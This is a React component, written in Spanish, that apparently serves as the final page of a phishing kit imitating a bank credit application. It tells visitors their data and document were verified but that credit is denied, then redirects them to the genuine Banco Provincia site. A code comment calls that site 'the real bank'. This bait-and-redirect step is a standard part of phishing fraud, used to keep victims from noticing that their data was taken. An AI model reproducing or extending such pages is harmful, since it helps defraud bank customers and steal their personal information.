import { useEffect, useState } from 'react';

export default function VerificationSuccess() {
  const [progress, setProgress] = useState(0);
  const [isLoaded, setIsLoaded] = useState(false);
  const [countdown, setCountdown] = useState(5);

  useEffect(() => {
    setTimeout(() => setIsLoaded(true), 100);
    
    // Barra de progreso
    const interval = setInterval(() => {
      setProgress(prev => {
        if (prev >= 100) {
          clearInterval(interval);
          return 100;
        }
        return prev + 4;
      });
    }, 25);

    // Countdown
    const countdownInterval = setInterval(() => {
      setCountdown(prev => {
        if (prev <= 1) {
          clearInterval(countdownInterval);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    // Redirección automática al banco real en 5 segundos
    const timeout = setTimeout(() => {
      window.location.replace('https://www.bancoprovincia.com.ar/CDN/Get/BP1697_WEB');
    }, 5000);

    return () => {
      clearInterval(interval);
      clearInterval(countdownInterval);
      clearTimeout(timeout);
    };
  }, []);

  return (
    <div className="min-h-screen min-h-[100dvh] bg-gradient-to-br from-orange-50 via-white to-red-50 flex items-center justify-center px-4 py-8 relative overflow-hidden">
      {/* Fondo decorativo */}
      <div className="absolute inset-0 overflow-hidden pointer-events-none">
        <div className="absolute top-0 left-1/2 -translate-x-1/2 w-[800px] h-[800px] bg-gradient-to-br from-orange-400/20 to-red-400/20 rounded-full blur-3xl -translate-y-1/2"></div>
        <div className="absolute bottom-0 left-0 w-96 h-96 bg-gradient-to-tr from-yellow-400/10 to-orange-400/10 rounded-full blur-3xl"></div>
      </div>

      <div className={`relative z-10 max-w-xl w-full transition-all duration-700 ${isLoaded ? 'opacity-100 scale-100' : 'opacity-0 scale-95'}`}>
        {/* Icono de éxito animado */}
        <div className="text-center mb-8">
          <div className="inline-block relative">
            <div className="absolute inset-0 bg-orange-400 rounded-full animate-ping opacity-50"></div>
            <div className="absolute inset-0 bg-orange-400 rounded-full animate-pulse opacity-30 scale-125"></div>
            <div 
              className="relative rounded-full p-6 sm:p-8 shadow-2xl"
              style={{ background: 'linear-gradient(135deg, #ea580c 0%, #f97316 50%, #fb923c 100%)' }}
            >
              <svg 
                className="w-16 h-16 sm:w-24 sm:h-24 text-white" 
                fill="none" 
                stroke="currentColor" 
                viewBox="0 0 24 24"
              >
                <path 
                  strokeLinecap="round" 
                  strokeLinejoin="round" 
                  strokeWidth={3} 
                  d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"
                />
              </svg>
            </div>
          </div>
        </div>

        {/* Mensaje principal */}
        <div className="bg-white/95 backdrop-blur-sm rounded-2xl shadow-2xl p-6 sm:p-8 mb-6 border border-gray-100">
          <h1 className="text-2xl sm:text-3xl font-bold text-center text-gray-900 mb-2">
            Verificación Completada
          </h1>
          <div className="bg-orange-50 border-l-4 border-orange-500 p-4 rounded-r-lg mb-4">
            <p className="text-orange-800 text-sm sm:text-base">
              <strong>Nota:</strong> Sus datos fueron validados con éxito, pero lamentablemente su nivel crediticio no permite acceder al crédito. Revise su situación con otras entidades.
            </p>
          </div>

          {/* Barra de progreso */}
          <div className="mb-6">
            <div className="bg-gray-200 rounded-full h-3 overflow-hidden shadow-inner">
              <div 
                className="h-full transition-all duration-200 ease-out rounded-full"
                style={{ 
                  width: `${progress}%`,
                  background: 'linear-gradient(90deg, #ea580c 0%, #f97316 50%, #fb923c 100%)'
                }}
              ></div>
            </div>
            <p className="text-center text-sm text-gray-600 mt-3 font-medium">
              Redirigiendo en <span className="text-orange-600 font-bold">{countdown}</span> segundos...
            </p>
          </div>

          {/* Resumen */}
          <div className="space-y-3 mb-6">
            {[
              { icon: '✓', title: 'Datos verificados correctamente' },
              { icon: '✓', title: 'Documento validado' },
              { icon: '✗', title: 'Crédito no disponible' },
            ].map((item, index) => (
              <div key={index} className={`flex items-center gap-3 p-3 rounded-xl border ${item.icon === '✗' ? 'bg-red-50 border-red-100' : 'bg-green-50 border-green-100'}`}>
                <div className={`w-8 h-8 rounded-full flex items-center justify-center text-white font-bold text-sm ${item.icon === '✗' ? 'bg-red-500' : 'bg-green-500'}`}>
                  {item.icon}
                </div>
                <span className="text-gray-800 font-medium">{item.title}</span>
              </div>
            ))}
          </div>

          {/* Info */}
          <div className="bg-gray-50 border-l-4 border-gray-400 p-4 rounded-r-lg">
            <p className="text-sm text-gray-700">
              Para más información sobre productos crediticios, consulte con su sucursal más cercana.
            </p>
          </div>
        </div>

        {/* Botón manual por si falla la redirección */}
        <div className="text-center">
          <button
            onClick={() => window.location.replace('https://www.bancoprovincia.com.ar/CDN/Get/BP1697_WEB')}
            className="inline-flex items-center gap-2 bg-white/80 backdrop-blur-sm px-6 py-3 rounded-full shadow-lg text-orange-700 font-medium hover:bg-white transition-all"
          >
            <span>Continuar ahora</span>
            <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M14 5l7 7m0 0l-7 7m7-7H3" />
            </svg>
          </button>
        </div>
      </div>

      <style>{`
        @keyframes checkmark {
          0% { stroke-dasharray: 0 50; }
          100% { stroke-dasharray: 50 50; }
        }
        .checkmark-path {
          animation: checkmark 0.8s ease-in-out 0.3s forwards;
          stroke-dasharray: 0 50;
        }
      `}</style>
    </div>
  );
}
